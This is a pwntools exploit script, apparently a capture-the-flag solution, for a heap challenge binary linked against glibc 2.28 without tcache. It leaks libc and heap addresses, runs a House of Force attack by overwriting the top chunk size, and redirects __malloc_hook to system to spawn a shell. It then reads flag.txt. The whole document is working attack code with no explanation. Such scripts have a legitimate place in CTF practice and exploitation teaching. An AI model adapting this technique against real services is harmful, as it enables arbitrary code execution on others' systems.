from pwn import *

elf = ELF('./task')
libc = ELF('./libc-2.28-no-tcache.so')
# libc = ELF('./libc-2.28-no-tcache-symbols.so')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *menu",
		"c"
	]))
elif args.REMOTE:
	host, port = args.get("HOST", "localhost"), args.get("PORT", 5000)
	p = remote(host, port)
else:
	p = process(elf.path)

p.recvuntil(b'puts')

puts = int(p.recvline().decode().split('@')[-1].strip(), 16)
heap = int(p.recvline().decode().split('@')[-1].strip(), 16)

print(f'puts {hex(puts)}')
print(f'heap {hex(heap)}')

libc.address = puts - libc.sym['puts']
print(f'__malloc_hook {hex(libc.sym["__malloc_hook"])}')

def malloc(size, contents=None):
	print(f'Requesting {hex(size)}')
	p.sendlineafter(b'Size: ', str(size).encode())
	if contents:
		p.sendlineafter(b'Data: ', contents)
		# print(p.recvline())

try:
	malloc(25, b'A' * 40 + p64(0xffffffffffffffff))
	malloc(libc.sym['__malloc_hook'] - heap - 0x48, b'B' * 8)
	malloc(10, p64(libc.sym['system']))
	malloc(next(libc.search(b"/bin/sh")))

	# p.interactive()
	sleep(1)

	p.sendline(b'cat flag.txt')

	d = p.clean(1.0)
	print(d)
except Exception as e:
	print(e)

